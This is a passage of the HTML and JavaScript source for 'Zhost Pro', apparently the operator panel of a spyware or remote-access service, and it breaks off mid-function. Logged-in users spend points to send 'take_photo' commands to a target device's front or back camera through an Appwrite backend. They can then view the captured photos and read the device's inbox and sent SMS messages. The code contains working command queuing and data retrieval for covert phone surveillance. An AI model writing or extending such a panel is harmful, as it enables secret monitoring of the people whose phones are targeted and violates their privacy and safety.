<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#1689FF">
<title>Zhost Pro</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  :root{
    --primary:#1689FF;--dark:#102A43;--text:#243B53;--muted:#718096;
    --light:#EEF7FF;--border:#CFE8FF;--btn:#087CFF;--btn-light:#21A8FF;
    --danger:#EF4444;--success:#10B981;
    --in:#10B981;--in-bg:#ECFDF5;
    --out:#3B82F6;--out-bg:#EFF6FF;
  }
  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#F5F9FF;color:var(--text);font-size:15px;line-height:1.5}
  body{display:flex;flex-direction:column;min-height:100vh}

  /* ── Login ── */
  #loginScreen{display:flex;flex-direction:column;justify-content:center;align-items:center;min-height:100vh;padding:24px;background:#fff}
  .login-box{width:100%;max-width:400px;padding:32px 24px;border-radius:20px;background:#fff;box-shadow:0 4px 24px rgba(16,42,67,.08);border:1px solid var(--border)}
  .logo-circle{width:68px;height:68px;border-radius:50%;background:linear-gradient(135deg,var(--primary),var(--btn-light));display:flex;align-items:center;justify-content:center;margin:0 auto 16px;box-shadow:0 6px 20px rgba(22,137,255,.32)}
  .logo-circle svg{width:32px;height:32px;fill:#fff}
  .login-title{font-size:22px;font-weight:700;color:var(--dark);text-align:center;margin-bottom:6px}
  .login-sub{font-size:13px;color:var(--muted);text-align:center;margin-bottom:26px}
  .field{margin-bottom:14px}
  .field label{display:block;font-size:12px;font-weight:600;color:var(--text);margin-bottom:6px}
  .field input{width:100%;padding:13px 14px;border:1.5px solid var(--border);border-radius:12px;font-size:15px;color:var(--text);background:#F8FBFF;transition:.15s;font-family:inherit;outline:none}
  .field input:focus{border-color:var(--primary);background:#fff}
  .field input::placeholder{color:#A0AEC0}
  .btn{width:100%;padding:14px;border:none;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;transition:.15s;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px}
  .btn:active{transform:scale(.98)}
  .btn:disabled{opacity:.6;cursor:not-allowed}
  .btn-primary{background:linear-gradient(135deg,var(--btn),var(--btn-light));color:#fff;box-shadow:0 4px 14px rgba(8,124,255,.28)}
  .btn-secondary{background:var(--light);color:var(--primary);border:1.5px solid var(--border)}
  .alert{padding:11px 14px;border-radius:10px;font-size:13px;margin-bottom:14px;display:none}
  .alert.show{display:block}
  .alert-error{background:#FEF2F2;color:#B91C1C;border:1px solid #FECACA}

  /* ── App ── */
  #appScreen{display:none;flex-direction:column;min-height:100vh}
  #appScreen.show{display:flex}
  .header{background:linear-gradient(135deg,var(--primary),var(--btn-light));color:#fff;padding:18px 20px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 2px 12px rgba(22,137,255,.18);position:sticky;top:0;z-index:10}
  .header h1{font-size:18px;font-weight:700;letter-spacing:.3px}
  .header .user-badge{font-size:12px;background:rgba(255,255,255,.2);padding:5px 12px;border-radius:20px;font-weight:500}

  /* ═══ Nav Bar (အလှဆင်) ═══ */
  .nav-bar{
    display:grid;
    grid-template-columns:repeat(4,1fr);
    gap:8px;
    padding:12px 14px;
    background:#fff;
    border-bottom:1px solid var(--border);
    position:sticky;
    top:63px;
    z-index:9;
  }
  .nav-btn{
    display:flex;
    flex-direction:column;
    align-items:center;
    gap:5px;
    padding:10px 6px;
    border-radius:14px;
    background:#fff;
    border:1.5px solid var(--border);
    cursor:pointer;
    transition:.18s;
    font-family:inherit;
    color:var(--muted);
    font-size:11.5px;
    font-weight:700;
    user-select:none;
  }
  .nav-btn .nav-icon{
    width:34px;
    height:34px;
    border-radius:10px;
    display:flex;
    align-items:center;
    justify-content:center;
    background:#F1F6FB;
    transition:.18s;
  }
  .nav-btn .nav-icon svg{
    width:18px;
    height:18px;
    fill:var(--muted);
    transition:.18s;
  }
  .nav-btn:active{transform:scale(.96)}
  .nav-btn.active{
    background:linear-gradient(135deg,var(--primary),var(--btn-light));
    color:#fff;
    border-color:transparent;
    box-shadow:0 6px 16px rgba(22,137,255,.32);
  }
  .nav-btn.active .nav-icon{
    background:rgba(255,255,255,.22);
  }
  .nav-btn.active .nav-icon svg{
    fill:#fff;
  }

  .section{display:none;padding:16px 14px 30px;max-width:720px;margin:0 auto;width:100%}
  .section.active{display:block;animation:fadeIn .25s ease}
  @keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}

  /* ── Profile ── */
  .profile-card{background:linear-gradient(135deg,var(--primary),var(--btn-light));border-radius:18px;padding:22px;color:#fff;margin-bottom:18px;box-shadow:0 8px 24px rgba(22,137,255,.24)}
  .profile-card .name{font-size:18px;font-weight:700;margin-bottom:4px}
  .profile-card .email{font-size:12.5px;opacity:.9;margin-bottom:16px;word-break:break-all}
  .profile-points{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,.2);padding:8px 16px;border-radius:20px;font-size:15px;font-weight:700}
  .profile-points svg{width:18px;height:18px;fill:#FFD700}

  .info-row{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:#fff;border:1px solid var(--border);border-radius:12px;margin-bottom:10px}
  .info-row .label{font-size:13px;color:var(--muted);font-weight:500}
  .info-row .value{font-size:14px;color:var(--dark);font-weight:600}

  /* ── Camera ── */
  .cam-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:20px}
  .cam-btn{background:#fff;border:1.5px solid var(--border);border-radius:16px;padding:22px 12px;display:flex;flex-direction:column;align-items:center;gap:10px;cursor:pointer;transition:.15s;font-family:inherit}
  .cam-btn:active{transform:scale(.97);background:var(--light)}
  .cam-btn .icon-wrap{width:52px;height:52px;border-radius:14px;background:linear-gradient(135deg,var(--primary),var(--btn-light));display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(22,137,255,.24)}
  .cam-btn .icon-wrap svg{width:26px;height:26px;fill:#fff}
  .cam-btn .cam-label{font-size:14px;font-weight:700;color:var(--dark)}
  .cam-btn .cam-cost{font-size:11.5px;color:var(--muted);font-weight:500}

  /* ── Photos ── */
  .photo-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-top:12px}
  @media(min-width:600px){.photo-grid{grid-template-columns:repeat(4,1fr)}}
  .photo-item{aspect-ratio:1;border-radius:10px;overflow:hidden;background:var(--light);cursor:pointer;position:relative;border:1px solid var(--border)}
  .photo-item img{width:100%;height:100%;object-fit:cover;display:block;opacity:0;transition:opacity .25s}
  .photo-item img.loaded{opacity:1}
  .photo-item .spinner{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:20px;height:20px;border:2.5px solid var(--border);border-top-color:var(--primary);border-radius:50%;animation:spin .8s linear infinite}
  @keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg)}}

  .empty{text-align:center;padding:50px 20px;color:var(--muted);font-size:14px}
  .empty svg{width:60px;height:60px;fill:var(--border);margin-bottom:14px}

  .section-title{font-size:15px;font-weight:700;color:var(--dark);margin-bottom:12px;display:flex;align-items:center;justify-content:space-between}
  .refresh-btn{background:var(--light);border:none;padding:6px 12px;border-radius:8px;color:var(--primary);font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;display:flex;align-items:center;gap:4px}
  .refresh-btn:active{transform:scale(.96)}

  /* ═══ SMS List (Collapsed) ═══ */
  .sms-list{display:flex;flex-direction:column;gap:8px}
  .sms-item{
    background:#fff;
    border:1.5px solid var(--border);
    border-radius:14px;
    padding:12px 14px;
    cursor:pointer;
    transition:.18s;
    position:relative;
    overflow:hidden;
  }
  .sms-item:active{transform:scale(.99)}
  /* in/out color bars */
  .sms-item.in::before{
    content:"";position:absolute;left:0;top:0;bottom:0;width:4px;
    background:var(--in);
  }
  .sms-item.out::before{
    content:"";position:absolute;left:0;top:0;bottom:0;width:4px;
    background:var(--out);
  }
  .sms-item.expanded{
    background:#FBFDFF;
    box-shadow:0 4px 14px rgba(16,42,67,.06);
  }
  .sms-head{display:flex;align-items:center;gap:8px;margin-bottom:4px}
  .sms-icon{
    width:28px;height:28px;border-radius:8px;
    display:flex;align-items:center;justify-content:center;
    flex-shrink:0;
  }
  .sms-icon svg{width:15px;height:15px;fill:#fff}
  .sms-item.in .sms-icon{background:linear-gradient(135deg,#10B981,#34D399)}
  .sms-item.out .sms-icon{background:linear-gradient(135deg,#3B82F6,#60A5FA)}
  .sms-sender{
    flex:1;font-size:13.5px;font-weight:700;color:var(--dark);
    overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
  }
  .sms-time{font-size:11px;color:var(--muted);white-space:nowrap;flex-shrink:0}
  .sms-chevron{
    width:14px;height:14px;flex-shrink:0;
    transition:transform .22s ease;
  }
  .sms-chevron svg{width:14px;height:14px;fill:var(--muted)}
  .sms-item.expanded .sms-chevron{transform:rotate(180deg)}
  .sms-item.expanded .sms-chevron svg{fill:var(--primary)}

  .sms-preview{
    font-size:12.5px;color:var(--text);
    overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
    padding-left:36px;
    margin-top:2px;
  }
  .sms-body{
    display:none;
    font-size:13px;color:var(--text);line-height:1.6;
    padding:12px 2px 4px;
    margin-top:8px;
    border-top:1px dashed var(--border);
    white-space:pre-wrap;word-break:break-word;
    animation:expandDown .25s ease;
  }
  @keyframes expandDown{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
  .sms-item.expanded .sms-body{display:block}
  .sms-item.expanded .sms-preview{display:none}

  .sms-meta{
    display:none;
    margin-top:10px;
    padding-top:10px;
    border-top:1px solid var(--border);
    font-size:11px;color:var(--muted);
    gap:10px;
    flex-wrap:wrap;
  }
  .sms-item.expanded .sms-meta{display:flex}
  .sms-meta span{display:flex;align-items:center;gap:4px}

  .sms-file-btn{
    display:none;
    margin-top:10px;
    padding:8px 12px;
    background:var(--light);
    border:1px solid var(--border);
    border-radius:10px;
    color:var(--primary);
    font-size:12.5px;
    font-weight:600;
    cursor:pointer;
    font-family:inherit;
    align-items:center;
    justify-content:center;
    gap:6px;
    width:100%;
    transition:.15s;
  }
  .sms-file-btn:active{transform:scale(.98);background:#DBEAFE}
  .sms-item.expanded .sms-file-btn{display:flex}

  /* badge */
  .sms-badge{
    font-size:9.5px;font-weight:800;letter-spacing:.4px;
    padding:2px 6px;border-radius:5px;
    text-transform:uppercase;
    flex-shrink:0;
  }
  .sms-item.in .sms-badge{background:var(--in-bg);color:#047857}
  .sms-item.out .sms-badge{background:var(--out-bg);color:#1D4ED8}

  /* ── Lightbox ── */
  .lightbox{display:none;position:fixed;inset:0;background:rgba(10,20,35,.95);z-index:100;align-items:center;justify-content:center;padding:20px}
  .lightbox.show{display:flex}
  .lightbox img{max-width:100%;max-height:90vh;border-radius:8px;box-shadow:0 10px 40px rgba(0,0,0,.6)}
  .lightbox-close{position:absolute;top:16px;right:16px;width:40px;height:40px;border-radius:50%;background:rgba(255,255,255,.15);border:none;color:#fff;font-size:22px;cursor:pointer;display:flex;align-items:center;justify-content:center;z-index:101}

  /* ── SMS Viewer ── */
  .sms-viewer{display:none;position:fixed;inset:0;background:rgba(10,20,35,.95);z-index:100;align-items:center;justify-content:center;padding:20px}
  .sms-viewer.show{display:flex}
  .sms-viewer-box{background:#fff;border-radius:14px;width:100%;max-width:640px;max-height:85vh;display:flex;flex-direction:column;overflow:hidden}
  .sms-viewer-head{padding:16px 18px;background:var(--light);border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;gap:10px}
  .sms-viewer-head h3{font-size:14px;color:var(--dark);font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
  .sms-viewer-body{padding:18px;overflow-y:auto;font-family:'SF Mono',Menlo,Consolas,monospace;font-size:12.5px;line-height:1.65;color:var(--text);white-space:pre-wrap;word-break:break-word}

  /* ── Toast ── */
  .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--dark);color:#fff;padding:12px 20px;border-radius:12px;font-size:13.5px;font-weight:500;box-shadow:0 8px 24px rgba(0,0,0,.24);z-index:200;opacity:0;transition:.3s;max-width:90vw;text-align:center}
  .toast.show{transform:translateX(-50%) translateY(0);opacity:1}
  .toast.success{background:var(--success)}
  .toast.error{background:var(--danger)}

  /* ── Overlay ── */
  .overlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.9);z-index:150;align-items:center;justify-content:center;flex-direction:column;gap:14px}
  .overlay.show{display:flex}
  .overlay .big-spinner{width:40px;height:40px;border:3.5px solid var(--border);border-top-color:var(--primary);border-radius:50%;animation:spin2 .8s linear infinite}
  @keyframes spin2{to{transform:rotate(360deg)}}
  .overlay .overlay-text{color:var(--primary);font-size:13px;font-weight:600}
</style>
</head>
<body>

<!-- ═══════════ LOGIN ═══════════ -->
<div id="loginScreen">
  <div class="login-box">
    <div class="logo-circle">
      <svg viewBox="0 0 24 24"><path d="M12 15.2a3.2 3.2 0 100-6.4 3.2 3.2 0 000 6.4z"/><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
    </div>
    <h2 class="login-title">Zhost Pro</h2>
    <p class="login-sub">Sign in to access your devices</p>
    <div id="loginAlert" class="alert alert-error"></div>
    <div class="field">
      <label>Email</label>
      <input id="emailInput" type="email" placeholder="you@example.com" autocomplete="email">
    </div>
    <div class="field">
      <label>Password</label>
      <input id="passwordInput" type="password" placeholder="••••••••" autocomplete="current-password">
    </div>
    <button id="loginBtn" class="btn btn-primary" style="margin-top:10px">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff"><path d="M10 17l5-5-5-5v3H3v4h7v3zm9-14H5c-1.1 0-2 .9-2 2v3h2V5h14v14H5v-3H3v3c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2z"/></svg>
      <span>Login</span>
    </button>
  </div>
</div>

<!-- ═══════════ APP ═══════════ -->
<div id="appScreen">
  <div class="header">
    <h1>Zhost Pro</h1>
    <span id="headerUser" class="user-badge">-</span>
  </div>

  <!-- Nav Buttons -->
  <div class="nav-bar">
    <div class="nav-btn active" data-tab="camera">
      <div class="nav-icon">
        <svg viewBox="0 0 24 24"><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
      </div>
      Camera
    </div>
    <div class="nav-btn" data-tab="photos">
      <div class="nav-icon">
        <svg viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
      </div>
      Photos
    </div>
    <div class="nav-btn" data-tab="sms">
      <div class="nav-icon">
        <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"/></svg>
      </div>
      SMS
    </div>
    <div class="nav-btn" data-tab="profile">
      <div class="nav-icon">
        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
      </div>
      Profile
    </div>
  </div>

  <!-- ═══ CAMERA ═══ -->
  <div id="sec-camera" class="section active">
    <div class="section-title">Remote Camera</div>
    <div class="cam-grid">
      <button class="cam-btn" data-cam="front">
        <div class="icon-wrap">
          <svg viewBox="0 0 24 24"><path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
        </div>
        <div class="cam-label">Front</div>
        <div class="cam-cost">-1 Point</div>
      </button>
      <button class="cam-btn" data-cam="back">
        <div class="icon-wrap">
          <svg viewBox="0 0 24 24"><path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
        </div>
        <div class="cam-label">Back</div>
        <div class="cam-cost">-1 Point</div>
      </button>
    </div>
    <div class="info-row">
      <span class="label">Available Points</span>
      <span class="value" id="camPoints">0</span>
    </div>
    <div class="info-row">
      <span class="label">Status</span>
      <span class="value" id="camStatus">Ready</span>
    </div>
  </div>

  <!-- ═══ PHOTOS ═══ -->
  <div id="sec-photos" class="section">
    <div class="section-title">
      Your Photos
      <button class="refresh-btn" id="refreshPhotos">↻ Refresh</button>
    </div>
    <div id="photoGrid" class="photo-grid"></div>
    <div id="photosEmpty" class="empty" style="display:none">
      <svg viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
      <div>No photos yet</div>
    </div>
  </div>

  <!-- ═══ SMS ═══ -->
  <div id="sec-sms" class="section">
    <div class="section-title">
      Messages
      <button class="refresh-btn" id="refreshSms">↻ Refresh</button>
    </div>
    <div id="smsList" class="sms-list"></div>
    <div id="smsEmpty" class="empty" style="display:none">
      <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
      <div>No messages yet</div>
    </div>
  </div>

  <!-- ═══ PROFILE ═══ -->
  <div id="sec-profile" class="section">
    <div class="profile-card">
      <div class="name" id="profName">-</div>
      <div class="email" id="profEmail">-</div>
      <div class="profile-points">
        <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
        <span id="profPoints">0</span>
        <span style="font-size:12px;opacity:.85;font-weight:500">points</span>
      </div>
    </div>
    <div class="info-row">
      <span class="label">User ID</span>
      <span class="value" id="profUserId" style="font-size:11px">-</span>
    </div>
    <div class="info-row">
      <span class="label">Account Status</span>
      <span class="value" id="profStatus">-</span>
    </div>
    <button class="btn btn-secondary" id="logoutBtn" style="margin-top:20px;color:#B91C1C">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="#B91C1C"><path d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z"/></svg>
      Logout
    </button>
  </div>
</div>

<!-- Lightbox (Photo) -->
<div id="lightbox" class="lightbox">
  <button class="lightbox-close" id="lightboxClose">×</button>
  <img id="lightboxImg" src="" alt="">
</div>

<!-- SMS Viewer -->
<div id="smsViewer" class="sms-viewer">
  <div class="sms-viewer-box">
    <div class="sms-viewer-head">
      <h3 id="smsViewerTitle">SMS File</h3>
      <button class="lightbox-close" id="smsViewerClose" style="position:static;width:32px;height:32px;background:#E5E7EB;color:#374151;font-size:18px">×</button>
    </div>
    <div class="sms-viewer-body" id="smsViewerBody">Loading...</div>
  </div>
</div>

<div id="toast" class="toast"></div>

<div id="overlay" class="overlay">
  <div class="big-spinner"></div>
  <div class="overlay-text" id="overlayText">Loading...</div>
</div>

<script>
/* ═══ CONFIG ═══ */
const API = "https://fra.cloud.appwrite.io/v1";
const PROJECT = "6ac22101001089112d96";
const DB = "6ac221fb00166d13f9de";
const T_USERS = "users";
const T_PHOTOS = "photos";
const T_COMMANDS = "commands";
const T_SMS = "sms";
const BUCKET = "photos";
const CAMERA_COST = 1;

/* ═══ STATE ═══ */
let state = {
  user: null,
  userRow: null,
  photos: [],
  sms: [],
};

/* ═══ Helpers ═══ */
const $ = (id) => document.getElementById(id);

function toast(msg, type = "") {
  const t = $("toast");
  t.textContent = msg;
  t.className = "toast show " + type;
  setTimeout(() => { t.className = "toast " + type; }, 2600);
}
function showOverlay(text = "Loading...") {
  $("overlayText").textContent = text;
  $("overlay").classList.add("show");
}
function hideOverlay() { $("overlay").classList.remove("show"); }
function showLoginError(msg) {
  const a = $("loginAlert");
  a.textContent = msg;
  a.className = "alert alert-error show";
}
function hideLoginError() {
  $("loginAlert").className = "alert alert-error";
}
function escapeHtml(s) {
  return String(s || "").replace(/[&<>"']/g, c => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
  })[c]);
}
function fmtTime(t) {
  try {
    const d = new Date(t);
    if (isNaN(d.getTime())) return t;
    const now = new Date();
    const isToday = d.toDateString() === now.toDateString();
    if (isToday) {
      return d.toLocaleTimeString([], {hour: "2-digit", minute: "2-digit"});
    }
    return d.toLocaleDateString([], {month: "short", day: "numeric"}) + " " +
           d.toLocaleTimeString([], {hour: "2-digit", minute: "2-digit"});
  } catch (e) { return t; }
}

async function api(method, path, body) {
  const opts = {
    method,
    headers: {
      "X-Appwrite-Project": PROJECT,
      "Content-Type": "application/json",
    },
    credentials: "include",
  };
  if (body) opts.body = JSON.stringify(body);
  const res = await fetch(API + path, opts);
  const text = await res.text();
  let data;
  try { data = text ? JSON.parse(text) : null; } catch (e) { data = text; }
  if (!res.ok) {
    const msg = (data && data.message) ? data.message : `HTTP ${res.status}`;
    throw new Error(msg);
  }
  return data;
}

/* ═══ LOGIN ═══ */
async function doLogin(email, password) {
  const res = await fetch(API + "/account/sessions/email", {
    method: "POST",
    headers: {
      "X-Appwrite-Project": PROJECT,
      "Content-Type": "application/json",
    },
    credentials: "include",
    body: JSON.stringify({ email, password }),
  });
  const text = await res.text();
  let data;
  try { data = text ? JSON.parse(text) : null; } catch (e) { data = null; }
  if (!res.ok) {
    const msg = data && data.message ? data.message : "Email သို့ Password မှားနေတယ်";
    throw new Error(msg);
  }
  return data;
}
async function getAccount() {
  return await api("GET", "/account");
}
async function findUserRow(userId, email) {
  const q = encodeURIComponent(JSON.stringify({
    method: "equal", attribute: "userId", values: [userId]
  }));
  try {
    const res = await api("GET",
      `/tablesdb/${DB}/tables/${T_USERS}/rows?queries[]=${q}`);
    if (res && res.rows && res.rows.length > 0) return res.rows[0];
  } catch (e) {}

  const q2 = encodeURIComponent(JSON.stringify({
    method: "equal", attribute: "email", values: [email]
  }));
  try {
    const res2 = await api("GET",
      `/tablesdb/${DB}/tables/${T_USERS}/rows?queries[]=${q2}`);
    if (res2 && res2.rows && res2.rows.length > 0) return res2.rows[0];
  } catch (e) {}
  return null;
}

/* ═══ PHOTOS ═══ */
async function loadPhotos() {
  if (!state.userRow) return;
  const userId = state.userRow.userId;
  const q = encodeURIComponent(JSON.stringify({
    method: "equal", attribute: "capturedByUserId", values: [userId]
  }));
  const q2 = encodeURIComponent(JSON.stringify({
    method: "orderDesc", attribute: "$createdAt"
  }));
  const q3 = encodeURIComponent(JSON.stringify({
    method: "limit", values: [50]
  }));
  const path = `/tablesdb/${DB}/tables/${T_PHOTOS}/rows?queries[]=${q}&queries[]=${q2}&queries[]=${q3}`;
  const res = await api("GET", path);
  const photos = (res && res.rows ? res.rows : []).filter(p => p.fileId && !p.isDeleted);
  state.photos = photos;
  renderPhotos(photos);
}
function photoUrl(fileId) {
  return `${API}/storage/buckets/${BUCKET}/files/${fileId}/view?project=${PROJECT}`;
}
function renderPhotos(photos) {
  const grid = $("photoGrid");
  const empty = $("photosEmpty");
  grid.innerHTML = "";
  if (!photos.length) { empty.style.display = "block"; return; }
  empty.style.display = "none";
  for (const p of photos) {
    const div = document.createElement("div");
    div.className = "photo-item";
    const sp = document.createElement("div");
    sp.className = "spinner";
    const img = document.createElement("img");
    img.src = photoUrl(p.fileId);
    img.loading = "lazy";
    img.onload = () => { img.classList.add("loaded"); sp.remove(); };
    img.onerror = () => { sp.remove(); };
    div.appendChild(sp);
    div.appendChild(img);
    div.onclick = () => openLightbox(photoUrl(p.fileId));
    grid.appendChild(div);
  }
}
function openLightbox(src) {
  $("lightboxImg").src = src;
  $("lightbox").classList.add("show");
}
$("lightboxClose").onclick = () => {
  $("lightbox").classList.remove("show");
  $("lightboxImg").src = "";
};

/* ═══ SMS ═══ */
async function loadSms() {
  if (!state.userRow) return;
  const userId = state.userRow.userId;
  const q = encodeURIComponent(JSON.stringify({
    method: "equal", attribute: "ownerUserId", values: [userId]
  }));
  const q2 = encodeURIComponent(JSON.stringify({
    method: "orderDesc", attribute: "receivedAt"
  }));
  const q3 = encodeURIComponent(JSON.stringify({
    method: "limit", values: [100]
  }));
  const path = `/tablesdb/${DB}/tables/${T_SMS}/rows?queries[]=${q}&queries[]=${q2}&queries[]=${q3}`;
  const res = await api("GET", path);
  const rows = (res && res.rows ? res.rows : []).filter(r => !r.isDeleted);
  state.sms = rows;
  renderSms(rows);
}

function renderSms(rows) {
  const el = $("smsList");
  const empty = $("smsEmpty");
  el.innerHTML = "";
  if (!rows.length) { empty.style.display = "block"; return; }
  empty.style.display = "none";

  for (const r of rows) {
    const type = (r.type || "inbox").toLowerCase();
    const isOut = type === "sent" || type === "outbox";
    const dir = isOut ? "out" : "in";
    const dirLabel = isOut ? "OUT" : "IN";
    const kind = (r.kind || "single").toLowerCase();
    const isBatch = kind === "batch" || kind === "initial" || kind === "offline";
    const badgeText = isBatch ? "BATCH" : dirLabel;

    // Icon (arrow in / arrow out)
    const iconSvg = isOut
      ? `<svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>`
      : `<svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>`;

    // Preview text (1 line)
    const preview = (r.body || "").split("\n")[0];

    const div = document.createElement("div");
    div.className = `sms-item ${dir}`;
    div.innerHTML = `
      <div class="sms-head">
        <div class="sms-icon">${iconSvg}</div>
        <span class="sms-sender">${escapeHtml(r.senderName || r.sender || "Unknown")}</span>
        <span class="sms-badge">${badgeText}</span>
        <span class="sms-time">${escapeHtml(fmtTime(r.receivedAt))}</span>
        <span class="sms-chevron"><svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></span>
      </div>
      <div class="sms-preview">${escapeHtml(preview)}</div>
      <div class="sms-body">${escapeHtml(r.body || "")}</div>
      <div class="sms-meta">
        <span>📅 ${escapeHtml(fmtTime(r.receivedAt))}</span>
        <span>📱 ${escapeHtml(r.sender || "Unknown")}</span>
      </div>
      ${r.fileId ? '<button class="sms-file-btn" type="button">📄 View full file</button>' : ''}
    `;

    // Click card → toggle expand
    div.addEventListener("click", (e) => {
      if (e.target.closest(".sms-file-btn")) return; // file button သီးသန့်
      div.classList.toggle("expanded");
    });

    // File button
    const fileBtn = div.querySelector(".sms-file-btn");
    if (fileBtn) {
      fileBtn.addEventListener("click", (e) => {
        e.stopPropagation();
        openSmsViewer(r.fileId, r.fileName || "SMS File");
      });
    }

    el.appendChild(div);
  }
}

function smsFileUrl(fileId) {
  return `${API}/storage/buckets/${BUCKET}/files/${fileId}/view?project=${PROJECT}`;
}

async function openSmsViewer(fileId, fileName) {
  $("smsViewerTitle").textContent = fileName;
  $("smsViewerBody").textContent = "Loading...";
  $("smsViewer").classList.add("show");
  try {
    const url = smsFileUrl(fileId);
    const res = await fetch(url, { credentials: "include" });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const text = await res.text();
    $("smsViewerBody").textContent = text;
  } catch (e) {
    $("smsViewerBody").textContent = "Failed to load file:\n" + e.message;
  }
}
$("smsViewerClose").onclick = () => {
  $("smsViewer").classList.remove("show");
  $("smsViewerBody").textContent = "";
};
$("smsViewer").onclick = (e) => {
  if (e.target.id === "smsViewer") {
    $("smsViewer").classList.remove("show");
    $("smsViewerBody").textContent = "";
  }
};

/* ═══ CAMERA ═══ */
async function sendCameraCommand(type) {
  if (!state.userRow) { toast("Please login first", "error"); return; }
  const points = state.userRow.points || 0;
  if (points < CAMERA_COST) {
    toast(`Not enough points (need ${CAMERA_COST}, have ${points})`, "error");
    return;
  }
  showOverlay("Sending command...");
  try {
    const newPoints = points - CAMERA_COST;
    const updPath = `/tablesdb/${DB}/tables/${T_USERS}/rows/${state.userRow.$id}`;
    await api("PATCH", updPath, { data: { points: newPoints } });
    state.userRow.points = newPoints;
    updatePointsUI();

    const chatId = state.userRow.telegramChatId || "";
    const cmdData = {
      targetDeviceId: state.userRow.userId,
      issuedByUserId: state.userRow.userId,
      action: "take_photo",
      status: "pending",
      payload: JSON.stringify({
        camera: type,
        chatId: chatId,
        label: type === "front" ? "Simple" : "Back",
        source: "webapp",
      }),
      expiresAt: new Date(Date.now() + 5 * 60 * 1000).toISOString(),
    };
    const cmdPath = `/tablesdb/${DB}/tables/${T_COMMANDS}/rows`;
    await api("POST", cmdPath, { rowId: "unique()", data: cmdData });
    hideOverlay();
